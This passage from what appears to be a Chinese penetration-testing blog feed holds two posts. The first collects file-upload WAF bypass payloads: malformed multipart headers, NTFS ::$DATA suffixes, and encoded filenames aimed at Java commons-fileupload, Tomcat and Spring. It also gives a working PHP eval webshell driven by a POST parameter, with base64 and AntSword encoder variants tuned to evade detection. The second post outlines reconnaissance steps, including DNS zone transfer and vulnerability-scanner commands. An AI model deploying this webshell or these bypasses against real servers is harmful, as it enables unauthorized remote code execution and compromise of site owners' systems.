name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">POST内容</span><br><span class="line">--boundary--  <span class="comment"># 结束标志</span></span><br></pre></td></tr></table></figure><h2 id="文件上传绕过手法"><a href="#文件上传绕过手法" class="headerlink" title="文件上传绕过手法"></a>文件上传绕过手法</h2><h3 id="绕过后缀"><a href="#绕过后缀" class="headerlink" title="绕过后缀"></a>绕过后缀</h3><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">   </span><br><span class="line">Content-Type: multipart/XXXXXX; boundary=----WebKxxxxx</span><br><span class="line">Content-Type: multipart/; boundary=----WebKxxxxx </span><br><span class="line">增加多个boundary</span><br><span class="line">php：可以在boundary前后添加任意字符</span><br><span class="line">大小写</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><h4 id="Content-Disposition"><a href="#Content-Disposition" class="headerlink" title="Content-Disposition"></a>Content-Disposition</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">大小写</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Content-Disposition   </span></span><br><span class="line">Content-Disposition 任意位置换行,空格，脏数据溢出</span><br><span class="line">多个Content-Disposition</span><br><span class="line">form-data删除，改为*</span><br><span class="line"></span><br><span class="line"><span class="comment"># filename    </span></span><br><span class="line">多个filename，多个;</span><br><span class="line">文件名单双引号数量</span><br><span class="line">filename字符左右可以加上一些空白字符%<span class="number">20</span> %<span class="number">09</span> %<span class="number">0</span>a %<span class="number">0</span>b %<span class="number">0</span>c %<span class="number">0</span>d %<span class="number">1</span>c %<span class="number">1</span>d %<span class="number">1</span>e %<span class="number">1</span>f</span><br><span class="line">插入转义字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content-type（增删，设置charset）</span><br><span class="line">    </span><br><span class="line">多个BODY</span><br><span class="line">多个boundary</span><br><span class="line">交换name和filename的顺序</span><br><span class="line">    </span><br><span class="line">排列组合</span><br></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h5 id="NTFS-流"><a href="#NTFS-流" class="headerlink" title="NTFS 流"></a>NTFS 流</h5><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">文件流 (本地文件系统) - Win32 apps | Microsoft Learn</a></p><p>fuzz可以的</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p><img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p><img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><h5 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件名尾加任意个. 或者任意个空格（对文件名无影响）</span><br><span class="line"></span><br><span class="line">windows文件名的保留字符（不允许出现）</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string">可以尝试在文件名后加上这些字符</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当filename=shell.php:.jpg</span><br><span class="line">结果：</span><br><span class="line">可以上传shell.php，但是会吃掉文件内容。。。</span><br><span class="line">其他的要不不可以，可以的话，上传的文件名为.jpg</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><h5 id="文件名长度"><a href="#文件名长度" class="headerlink" title="文件名长度"></a>文件名长度</h5><p>截断超长文件名</p><p>windows文件名</p><p><img src="/../images/image-20230618171438236.png" alt="image-20230618171438236"></p><p>linux文件名：linux中文件名最长为255字符，文件路径最大长度为4096字符</p><p>如果后端脚本没有限制上传文件名长度，可以通过多次测试，上传名为aaaaa…(200+).php.jpg，把最后的.jpg挤出去。</p><h3 id="绕过文件内容检测–免杀"><a href="#绕过文件内容检测–免杀" class="headerlink" title="绕过文件内容检测–免杀"></a>绕过文件内容检测–免杀</h3><ul><li>waf检测</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内容、创建日期、文件大小、通信流量特征</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于静态引擎的绕过，可以通过拆分关键词、</span><br><span class="line">加入能够引发解析干扰的畸形字符等;</span><br><span class="line"></span><br><span class="line">而对于动态引擎，需要分析它跟踪了哪些输入</span><br><span class="line">点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则</span><br></pre></td></tr></table></figure><p><a href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">简单理解污点分析技术 | K0rz3n’s Blog</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">另类的入口</span><br><span class="line">各种混淆（编码加密，进制转换，反序列化...）</span><br><span class="line">符号干扰，绕过正则，拼接null,\n,\r,\t等</span><br><span class="line">信息差绕过（加入外部因素后才是webshel，量子WEBshell😋）比如截取文件名，目录名，传入随机数种子等</span><br></pre></td></tr></table></figure><ul><li>传统webshell</li></ul><p>学习：</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShell通用免杀的思考 - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>代码审计知识星球</p><p>收集：</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><h3 id="绕过流量检测–特征-x2F-通信加密"><a href="#绕过流量检测–特征-x2F-通信加密" class="headerlink" title="绕过流量检测–特征&#x2F;通信加密"></a>绕过流量检测–特征&#x2F;通信加密</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">弱特征：HTTP Header</span><br><span class="line">request和response内容</span><br></pre></td></tr></table></figure><p>参考之前HW看的文章</p><ul><li><p>哥斯拉</p><p><a href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业门户</a></p></li><li><p>冰蝎</p><p><a href="https://xz.aliyun.com/t/2744">利用动态二进制加密实现新型一句话木马之Java篇 - 先知社区</a></p><p><a href="https://www.secpulse.com/archives/195173.html">冰蝎V4.0流量分析到攻防检测 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://xz.aliyun.com/t/12453">冰蝎4.0自定义加密 - 先知社区</a></p></li><li><p>蚁剑</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="安全🐕检测内容"><a href="#安全🐕检测内容" class="headerlink" title="安全🐕检测内容"></a>安全🐕检测内容</h2><ul><li><p>不允许php后缀上传</p></li><li><p>上传时，不检查文件内容</p></li><li><p>访问时，不允许访问含有恶意内容的php文件</p></li></ul><h2 id="部分成功的"><a href="#部分成功的" class="headerlink" title="部分成功的"></a>部分成功的</h2><h3 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h3><p>waf是解析最后一个参数，最后一个;后面的，但是如果最后一个；后面没有参数，</p><p>后端就取前一个,waf识别到空</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># 双引号不行</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">除了shell.php处，其他地方加换行，或脏数据都可</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>删除<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>增加<code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>安全🐕+代码白名单（后缀只允许图片）</p><p>上面任意一个绕过（除了；绕过）+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h3 id="内容检测绕过"><a href="#内容检测绕过" class="headerlink" title="内容检测绕过"></a>内容检测绕过</h3><p>安全🐕的内容检测随便改一下就过了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="流量检测绕过"><a href="#流量检测绕过" class="headerlink" title="流量检测绕过"></a>流量检测绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#命令执行限制</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>对流量进行一个<code>base64</code>加密即可</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>蚁剑</p><p>编码器</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>选择编码器</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h1 id="JAVA文件上传绕过补充"><a href="#JAVA文件上传绕过补充" class="headerlink" title="JAVA文件上传绕过补充"></a>JAVA文件上传绕过补充</h1><h2 id="commons-fileupload组件–QP编码"><a href="#commons-fileupload组件–QP编码" class="headerlink" title="commons-fileupload组件–QP编码"></a>commons-fileupload组件–QP编码</h2><p>org.apache.commons.fileupload对传入的值进行了<code>MimeUtility.decodeText</code>操作</p><p>为了符合<a href="https://www.rfc-editor.org/rfc/rfc2047">RFC 2047</a>规范会将</p><ol><li>要求以<code>=?</code>开头</li><li>之后要求还要有一个<code>?</code>，中间的内容为编码，也就是<code>=?charset?</code></li><li>获取下一个<code>?</code>间的内容，这里与下面的编解码有关</li><li>之后定位到最后一个<code>?=</code>间内容执行解码</li></ol><p>例子</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">=?gbk?Q?=31=2e=6a=73=70?=</span><br></pre></td></tr></table></figure><p><code>B</code>，<code>Q</code>，分别对应<code>Base64</code>以及<code>Quoted-printable</code>编码</p><blockquote><p>Quoted-printable将任何8-bit字节值可编码为3个字符：一个等号”&#x3D;”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。例如，ASCII码换页符（十进制值为12）可以表示为”&#x3D;0C”， 等号”&#x3D;”（十进制值为61）必须表示为”&#x3D;3D”，gb2312下“中”表示为&#x3D;D6&#x3D;D0</p></blockquote><p>Payload</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">boundary==?gbk?Q?=2d=2d=2d=2d=57=65=62=4b=69=74=46=6f=72=6d=42=6f=75=6e=64=61=72=79=54=79=42=44=6f=4b=76=61=6d=4e=35=38=6c=63=45=77?=</span><br><span class="line"></span><br><span class="line">解码后</span><br><span class="line">boundary=----WebKitFormBoundaryTyBDoKvamN58lcEw</span><br></pre></td></tr></table></figure><p><img src="/../images/14.png" alt="img"></p><p>解码时只会提取<code>=??=</code>之间的内容，所以可以在最后插入混淆字符</p><p><img src="/../images/16.png" alt="img"></p><p>处理过程中还有对<code> \t\r\n</code>的处理</p><p>可以将文件名拆分并插入\t\r\n</p><p><img src="/../images/18.png" alt="img"></p><h2 id="Tomcat与Spring文件上传"><a href="#Tomcat与Spring文件上传" class="headerlink" title="Tomcat与Spring文件上传"></a>Tomcat与Spring文件上传</h2><p>如果首位是<code>&quot;</code>(前提条件是里面有<code>\</code>字符)，那么就会去掉<code>&quot;</code>，从第二个字符开始取值，并且末尾也会往前移动一位，同时会忽略字符<code>\</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">filename=&quot;y4\.jspZ</span><br><span class="line">filename=&quot;1.txt\&quot;.jsp&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/10.png" alt="img"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data*;;;;;;;;;;name*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00d%00e%00p%00l%00o%00y%00W%00a%00r&quot;;;;;;;;;filename*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot;</span><br><span class="line"></span><br><span class="line"># Spring5支持的编码UTF-8/ISO-8859-1/US_ASCII</span><br><span class="line">filename*=utf8&#x27;das&#x27;1.jsp</span><br><span class="line">filename*=utf8&quot;das&quot;1.jsp</span><br><span class="line">filename*=utf8&quot;das&quot;1.jsp;sd=1</span><br><span class="line">filename*=&quot;utf8&#x27;das&#x27;1.jsp&quot;</span><br><span class="line">filename*=&quot;utf8&#x27;das&#x27;1.jsp&quot;;;;;asdsad;</span><br><span class="line"># 再加url编码</span><br><span class="line">filename*=utf8&quot;das&quot;1.js%70;sd=1</span><br><span class="line"></span><br><span class="line">filename=1.jsp;.txt;</span><br><span class="line">filename=&quot;1.txt&quot;.jsp;txt;</span><br><span class="line"></span><br><span class="line"># 多个filename组合绕过</span><br><span class="line">filename=&quot;1.txt&quot;;filename*=&quot;UTF-8&quot;&#x27;sad&#x27;%32%2e%6a%73%70 #%32%2e%6a%73%70→2.jsp</span><br><span class="line">z=&quot;filename=&quot;1.jsp&quot;&quot;;filename=&quot;1.txt&quot;</span><br><span class="line">z=&quot;filename=1.jsp;&quot;;filename=&quot;1.txt&quot;</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/12684">https://xz.aliyun.com/t/12684</a></p><p><a href="https://xz.aliyun.com/t/368">我的WafBypass之道（SQL注入篇） - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/10515">文件上传绕过思路总结 - 先知社区 (aliyun.com)</a></p><p>[Bypass WAF Cookbook - MayIKissYou (wooyun.js.org)](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">WAF是如何被绕过的？-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://xz.aliyun.com/t/11607#toc-1">玄武盾的几种绕过姿势 - 先知社区</a></p><p><a href="https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/">Java文件上传大杀器-绕waf(针对commons-fileupload组件) | Y4tacker’s Blog</a></p><p><a href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/#Spring5">探寻Tomcat文件上传流量层面绕waf新姿势 | Y4tacker’s Blog</a></p><p><a href="https://y4tacker.github.io/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/#%E7%81%B5%E6%B4%BB%E7%9A%84parseQuotedToken">探寻Java文件上传流量层面waf绕过姿势系列二 | Y4tacker’s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试流程</title>
      <link href="/2023/06/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/06/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h1><p><img src="/../images/1550719703_5c6e1ad700bb6-1685533751883.png!small" alt="图片.png"></p><p>​<a href="https://www.freebuf.com/column/196291.html">渗透测试的8个步骤 - FreeBuf网络安全行业门户</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明确目标：与客户交流，得到渗透的范围，规则和需求</span><br><span class="line">信息收集：资产收集+敏感信息收集+指纹识别</span><br><span class="line">漏洞探测和信息分析：漏洞探测与利用</span><br><span class="line">获取所需：后渗透</span><br><span class="line">信息整理和形成报告：产出报告</span><br></pre></td></tr></table></figure><h1 id="外网简化流程"><a href="#外网简化流程" class="headerlink" title="外网简化流程"></a>外网简化流程</h1><blockquote><p>理想无waf情况，有waf就要尽可能地减少主动行为（被动信息收集，不扫描&#x2F;慢速扫描）</p></blockquote><ul><li><p>公司到域名：enscan，icp-domains</p></li><li><p>子域名收集：oneforall（子域名爆破耗时，某些情况下可以选择不使用）+ 其他搜索引擎（不同的语法）+爬虫</p></li><li><p>IP</p><ul><li><p>CDN识别：FCDN</p></li><li><p>域名→IP→C段：CIPR </p></li><li><p>全端口扫描：Nmap，maascan，Goby</p></li></ul></li><li><p>URL&#x3D;子域名收集+端口拼接</p><ul><li><p>验活：httpx</p></li><li><p>指纹识别：Ehole（chunsou的指纹）</p></li></ul></li><li><p>漏洞扫描：AWVS，XPOC，Afrog，nuclei</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nuclei.exe -l urls.txt -severity high,critical</span><br><span class="line">afrog.exe -T ../urls.txt -S medium, high, critical</span><br></pre></td></tr></table></figure></li><li><p>目录扫描：dirsearch</p></li><li><p>敏感信息收集：接口，js文件以及各种公开信息中的敏感信息，社工，供应商</p></li><li><p>测试</p><blockquote><p>可选被动扫描：Xray，RouteVulScan（Burp递归目录扫描）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nday</span><br><span class="line">弱口令</span><br><span class="line">未授权访问</span><br><span class="line">逻辑漏洞</span><br><span class="line">常见web漏洞</span><br><span class="line">接口测试</span><br><span class="line">代码审计</span><br><span class="line">小程序</span><br><span class="line">app</span><br></pre></td></tr></table></figure></li></ul><h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><h2 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h2><p><strong>尽可能的扩大攻击面</strong></p><h2 id="主域名收集"><a href="#主域名收集" class="headerlink" title="主域名收集"></a>主域名收集</h2><h3 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h3><ul><li><p>是什么</p><p>ICP备案是指网站在信息产业部提交网站信息进行官方认可。</p><p>所以国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。</p></li><li><p>有什么用</p><p>通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。</p></li><li><p>在线查询</p><p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery">ICP&#x2F;IP地址&#x2F;域名信息备案管理系统</a></p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li><li><p>工具</p><p><a href="https://github.com/1in9e/icp-domains">1in9e&#x2F;icp-domains: 输入一个域名，输出ICP备案所有关联域名</a></p></li></ul><h3 id="WhoIs"><a href="#WhoIs" class="headerlink" title="WhoIs"></a>WhoIs</h3><ul><li><p>是什么</p><p><code>WHOIS</code>是用来查询互联网中域名的IP以及所有者等信息的传输协议。</p></li><li><p>有什么用</p><p>通过查询目标的WHOIS信息，可以对联系人、联系邮箱等信息进行反查，可以获取更多相关的域名信息。</p></li><li><p>在线查询</p><p><a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家</a></p></li></ul><h3 id="股权信息"><a href="#股权信息" class="headerlink" title="股权信息"></a>股权信息</h3><ul><li><p>是什么，有什么用</p><p>通过查询股权信息，或者股权穿透图，寻找子公司和孙公司等，一般对外投资超过50%或者有行政权限的都可以算目标</p></li><li><p>查询网站</p><p><a href="https://www.qcc.com/">企查查 </a></p><p><a href="https://www.tianyancha.com/">天眼查</a></p></li></ul><h3 id="其他应用中的域名-x2F-IP"><a href="#其他应用中的域名-x2F-IP" class="headerlink" title="其他应用中的域名&#x2F;IP"></a>其他应用中的域名&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">微信/支付宝小程序</span><br><span class="line">微信公众号</span><br><span class="line">手机APP：抓包，历史版本</span><br></pre></td></tr></table></figure><h3 id="DNS共享记录查询"><a href="#DNS共享记录查询" class="headerlink" title="DNS共享记录查询"></a>DNS共享记录查询</h3><ul><li><p>原理</p><p>查询共享DNS服务器的主机来获取到相关的域名</p></li><li><p>步骤</p><ol><li><p>首先查询目标是否存在自建的NS服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>将非权威应答中的ns服务器带到下面的网站查询</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="聚合工具"><a href="#聚合工具" class="headerlink" title="聚合工具"></a>聚合工具</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="枚举爆破"><a href="#枚举爆破" class="headerlink" title="枚举爆破"></a>枚举爆破</h3><ul><li><p>原理</p><p>通过不断的拼接字典中的子域名前缀去枚举域名的A记录，再对其进行验证，但是该方法一般需要解决泛解析问题。</p></li><li><p>泛解析</p><p>A记录：*.khaz.top → 1.1.1.1 （这样xxx.khaz.top域名在进行dns解析时都会指向1.1.1.1）</p><p>如何解决泛解析：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 黑名单IP法</span></span><br><span class="line">通过获取一个不存在的子域名相应解析IP，来记录标记黑名单ip，再爆破字典时，解析到的IP在这个黑名单ip中，则跳过，不存在就继续处理。</span><br><span class="line"><span class="comment"># TTL</span></span><br><span class="line">在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录。</span><br></pre></td></tr></table></figure><blockquote><p>以oneforall为例：</p><p>oneforall会首先访问一个随机的并不存在的域，通过返回结果判断是否存在泛解析，确定存在泛解析以后，程序会开始不断的循环产生随机域名，去向服务器查询，将每次查询到的IP和TTL记录下来，直到大部分的IP地址出现次数都大于两次，则IP黑名单的收集结束，在得到了IP黑名单以后，oneforall接下来会将自己的字典中的每一项和要指定查询的域名进行拼接。在爆破过程中根据IP黑名单进行过滤。但这种宽泛的过滤容易导致漏报，所以oneforall将 TTL 也作为黑名单规则的一部分，评判的依据是：在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录。</p></blockquote></li></ul><h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><ul><li><p>是什么</p><p>证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁。</p></li><li><p>有什么用</p><p>因为是公开的，所以任何人都可以访问到其中的CA 证书，包含了域名、子域名、邮箱等敏感信息。</p></li><li><p>在线查询</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNS公开数据集"><a href="#DNS公开数据集" class="headerlink" title="DNS公开数据集"></a>DNS公开数据集</h3><p>利用已有公开的扫描数据集，对子域名信息进行收集。</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h3><ul><li><p>是什么</p><p>DNS服务器分为主服务器，备份服务器，缓存服务器。</p><p><strong>域传送</strong>是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。</p></li><li><p>有什么用</p><p>若 DNS 服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者。</p></li><li><p>检测方法</p><ul><li><p>dig请求</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到NS服务器</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送axfr请求</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmap脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul><li><p>传统搜索引擎</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx 排除哪些子域)</span><br></pre></td></tr></table></figure></li><li><p>网络空间测绘</p></li></ul><h3 id="站点爬虫"><a href="#站点爬虫" class="headerlink" title="站点爬虫"></a>站点爬虫</h3><p>通过爬取网站中的url链接来发现新的子域名</p><p>oneforall很多时候没有爬取出来，需要手动用urlfinder找一下</p><h3 id="站点信息泄漏"><a href="#站点信息泄漏" class="headerlink" title="站点信息泄漏"></a>站点信息泄漏</h3><ul><li>crossdomain.xml</li><li>sitemap.xml</li><li>响应包中的CSP其中*-src可能会存在域名信息</li></ul><h3 id="第三方在线平台"><a href="#第三方在线平台" class="headerlink" title="第三方在线平台"></a>第三方在线平台</h3><ul><li><p><a href="https://securitytrails.com(ui好看,结果最多)/">https://securitytrails.com（UI好看，结果最多）</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="聚合工具-1"><a href="#聚合工具-1" class="headerlink" title="聚合工具"></a>聚合工具</h3><h4 id="收集工具"><a href="#收集工具" class="headerlink" 